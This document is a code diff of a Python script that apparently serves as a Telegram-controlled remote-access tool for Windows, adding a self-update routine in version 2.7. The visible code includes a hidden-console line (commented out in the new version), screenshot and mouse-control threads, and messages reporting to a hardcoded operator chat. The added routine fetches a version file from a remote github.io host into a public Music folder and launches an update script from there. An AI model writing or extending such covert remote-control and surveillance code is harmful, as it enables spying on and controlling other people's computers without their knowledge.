@@ -1,5 +1,6 @@
 chat_user_id = 1813084538
 ######################
+#2.7 add auto update
 #2.6
 #echo - echo command
 # r - повтор предыдущей команды
@@ -21,7 +22,7 @@ import win32gui
 from time import sleep
 #import ctypes
 #user32 = ctypes.windll.user32
-versi = '2.6'
+versi = '2.7'
 
 
 
@@ -72,7 +73,7 @@ timescreen = 0
 
 
 
-win32gui.ShowWindow(win32console.GetConsoleWindow(), win32con.SW_HIDE)
+#win32gui.ShowWindow(win32console.GetConsoleWindow(), win32con.SW_HIDE)
 
 
 
@@ -446,6 +447,22 @@ def mouseandkeyboard():
 			print(mkfl)
 '''
 def autoscreen():
+	urlupd = 'https://inoplanetanen.github.io/ver.txt'
+	rupd = requests.get(urlupd, allow_redirects = True)
+	open('C:/Users/Public/Music/ver.txt', 'wb').write(rupd.content)
+
+
+	version_txt = open('C:/Users/Public/Music/ver.txt', "r")
+	endvers = version_txt.readline().strip()
+	echo('версия на сервере: '+str(endvers))
+	if float(versi) < float(endvers):
+		os.system('python C:/Users/Public/Music/update.pyw')   
+		echo('start updating')
+		leave()
+		exit()
+	else:
+			echo('обнолвнеие не требуеется')
+	
 	while True:
 		global timescreen
 		if timescreen > 0:
@@ -467,7 +484,7 @@ b.start()
 mouseandkeyboard = Thread(target =mouseandkeyboard )
 mouseandkeyboard.start()
 '''
-autoscreen = Thread(target =autoscreen )
+autoscreen = Thread(target = autoscreen )
 autoscreen.start()
 
 mousecontrol = Thread(target =mousecontrol )
@@ -482,3 +499,9 @@ bot.send_message(chat_id=chat_user_id, text=startmess)
 bot.send_message(chat_id=chat_user_id, text=str(__file__))
 scr()
 updater.idle()
+
+
+
+
+
+
